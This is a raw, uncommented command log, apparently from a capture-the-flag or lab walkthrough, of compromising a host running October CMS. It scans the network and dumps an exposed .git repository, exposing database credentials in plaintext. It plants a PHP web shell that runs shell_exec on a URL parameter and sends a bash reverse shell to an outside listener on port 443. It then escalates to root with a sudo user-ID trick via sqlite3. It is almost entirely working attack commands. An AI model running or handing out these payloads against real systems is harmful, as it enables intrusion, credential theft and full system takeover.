```java
neofetc
sudo arp-scan -I eth0 --localnet
ping -c 1 192.168.153.160
mkdir {Scan,Exploit,Content} && ls && cd Scan 
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.153.160 -oG allports
sudo nmap -sCV -p22,80,8585 192.168.153.160 -oN targeted
whatweb 192.168.153.160
whatweb 192.168.153.160:8585
gobuster dir -u http://192.168.153.160/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 
svn checkout https://github.com/internetwache/GitTools/trunk/Dumper
svn checkout https://github.com/internetwache/GitTools/trunk/Extractor
./gitdumper.sh http://192.168.153.160/.git/ ../project
./extractor.sh ../project ../fullproject
cd fullproject
cd config
cat databases
october
SQ66EBYx4GT3byXH
octoberdb
https://bcrypt-generator.com/

function onStart()
{
    $this->page["myVar"] = shell_exec($_GET['cmd']);
}

{{ this.page.myVar }}

http://192.168.153.160/?cmd=whoami

192.168.153.160/?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.153.152/443 0>%261"

sudo nc -nlvp 443 
script /dev/null -c bash
stty raw -echo; fg  
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 59 columns 239
cd /var/backup
cat app.ini.bak | grep -v "^;" | grep -i pass
UfFPTF8C8jjxVF2m
sudo -l
sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'


```

